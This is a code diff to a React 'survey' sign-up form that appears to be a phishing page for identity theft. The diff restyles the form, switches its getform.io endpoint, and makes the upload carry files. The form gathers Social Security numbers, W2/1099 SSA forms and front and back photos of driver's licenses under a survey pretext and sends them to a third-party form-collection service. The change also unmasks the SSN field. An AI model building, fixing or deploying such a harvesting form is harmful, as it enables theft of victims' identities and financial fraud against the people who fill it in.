@@ -1,7 +1,7 @@
-"use client"
+"use client";
 
-import type React from "react"
-import { useState } from "react"
+import type React from "react";
+import { useState } from "react";
 import BackgroundImage from "../assets/background-image001.jpg";
 
 const initialState = {
@@ -24,54 +24,65 @@ const initialState = {
   W21099SSAFORM: null as File | null,
   DriverLicenseFront: null as File | null,
   DriverLicenseBack: null as File | null,
-}
+};
 
-type FormData = typeof initialState
+type FormData = typeof initialState;
 
 export default function SurveyForm() {
-  const [step, setStep] = useState(1)
-  const [formData, setFormData] = useState<FormData>(initialState)
-  const [isSubmitting, setIsSubmitting] = useState(false)
-  const [isSubmitted, setIsSubmitted] = useState(false)
+  const [step, setStep] = useState(1);
+  const [formData, setFormData] = useState<FormData>(initialState);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isSubmitted, setIsSubmitted] = useState(false);
 
-  const handleStartSurvey = () => setStep(2)
+  const handleStartSurvey = () => setStep(2);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const { name, value, type, files } = e.target
+    const { name, value, type, files } = e.target;
     if (type === "file" && files) {
-      setFormData((prev) => ({ ...prev, [name]: files[0] }))
+      setFormData((prev) => ({ ...prev, [name]: files[0] }));
     } else {
-      setFormData((prev) => ({ ...prev, [name]: value }))
+      setFormData((prev) => ({ ...prev, [name]: value }));
     }
-  }
+  };
 
+  // FIX: Build FormData from React state to ensure files are included
   const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
-    e.preventDefault()
-    setIsSubmitting(true)
-    const form = e.currentTarget
-    const formData = new FormData(form)
+    e.preventDefault();
+    setIsSubmitting(true);
+    const data = new FormData();
+
+    Object.entries(formData).forEach(([key, value]) => {
+      if (
+        key === "W21099SSAFORM" ||
+        key === "DriverLicenseFront" ||
+        key === "DriverLicenseBack"
+      ) {
+        if (value instanceof File) {
+          data.append(key, value);
+        }
+      } else if (typeof value === "string") {
+        data.append(key, value);
+      }
+    });
 
     try {
-      const response = await fetch("https://getform.io/f/azywwdrb", {
+      const response = await fetch("https://getform.io/f/bdrgrynb", {
         method: "POST",
-        body: formData,
-        headers: {
-          Accept: "application/json",
-        },
-      })
+        body: data,
+      });
 
       if (response.ok) {
-        setIsSubmitted(true)
+        setIsSubmitted(true);
       } else {
-        throw new Error("Form submission failed")
+        throw new Error("Form submission failed");
       }
     } catch (error) {
-      console.error("Submission error:", error)
-      alert("Failed to submit survey. Please try again.")
+      console.error("Submission error:", error);
+      alert("Failed to submit survey. Please try again.");
     } finally {
-      setIsSubmitting(false)
+      setIsSubmitting(false);
     }
-  }
+  };
 
   if (isSubmitted) {
     return (
@@ -81,12 +92,13 @@ export default function SurveyForm() {
           <p className="text-xl text-gray-600">You have successfully submitted the form.</p>
         </div>
       </div>
-    )
+    );
   }
 
   if (step === 1) {
     return (
-      <div className="min-h-screen flex items-center justify-center p-4 bg-cover bg-center"
+      <div
+        className="min-h-screen flex items-center justify-center p-4 bg-cover bg-center"
         style={{ backgroundImage: `url(${BackgroundImage})` }}
       >
         <div className="text-center relative z-10">
@@ -102,12 +114,12 @@ export default function SurveyForm() {
           </button>
         </div>
       </div>
-    )
+    );
   }
 
   return (
-    <div className="min-h-screen flex items-center justify-center p-4 bg-white">
-      <div className="w-full md:w-3/5 bg-white shadow-lg rounded-lg p-8">
+    <div className="min-h-screen flex items-center justify-center bg-white">
+      <div className="w-full md:w-3/5 bg-white rounded-lg p-8">
         <form onSubmit={handleSubmit} className="space-y-6">
           <input type="hidden" name="_captcha" value="false" />
           <h1 className="text-4xl font-semibold text-center mb-4">Sign Up Form</h1>
@@ -118,7 +130,6 @@ export default function SurveyForm() {
               <label htmlFor={key} className="block text-xl mb-2">
                 {index + 1}. {key === "W21099SSAFORM" ? "W2 / 1099 SSA FORM" : key.replace(/([A-Z])/g, " $1").trim()}
               </label>
-
               {key === "Gender" ? (
                 <div className="flex space-x-4">
                   <label className="inline-flex items-center">
@@ -130,7 +141,7 @@ export default function SurveyForm() {
                       onChange={handleInputChange}
                       className="mr-2"
                       required
-                    />
+                    />{" "}
                     Male
                   </label>
                   <label className="inline-flex items-center">
@@ -142,7 +153,7 @@ export default function SurveyForm() {
                       onChange={handleInputChange}
                       className="mr-2"
                       required
-                    />
+                    />{" "}
                     Female
                   </label>
                 </div>
@@ -160,17 +171,13 @@ export default function SurveyForm() {
                 <input
                   id={key}
                   name={key}
-                  type={key === "Email" ? "email" : key === "SocialSecurityNumber" ? "password" : "text"}
+                  type={key === "Email" ? "email" : "text"}
                   value={formData[key as keyof FormData] as string}
                   onChange={handleInputChange}
-                  className="w-full p-2 border border-gray-300 rounded"
+                  className="w-full p-2 border-b-2 border-gray-400 outline-none focus:border-blue-500 transition"
                   required
                 />
               )}
-
-              <span className="inline-block bg-gray-200 text-gray-700 px-2 py-1 rounded-full text-sm mt-1">
-                Required
-              </span>
             </div>
           ))}
 
@@ -189,5 +196,5 @@ export default function SurveyForm() {
         </form>
       </div>
     </div>
-  )
+  );
 }
